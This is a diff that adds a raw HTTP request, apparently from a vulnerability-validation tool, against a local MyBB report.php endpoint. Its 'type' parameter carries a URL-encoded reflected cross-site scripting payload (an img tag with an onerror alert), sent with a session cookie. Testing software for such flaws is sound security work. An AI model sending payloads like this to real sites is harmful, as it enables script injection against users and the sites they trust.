@@ -1,0 +1,5 @@
+GET /report.php?type=%3Cimg%20src%3Dx%20onerror%3Dalert('xssfa5cd4')%3E HTTP/1.1
+Host: localhost:25850
+Cookie: mybbuser=7_6dc77e8e757198d52d413523ff27488a86feec78eb2fae8cdf
+User-Agent: cvehunter-mybb-validation/1.0
+
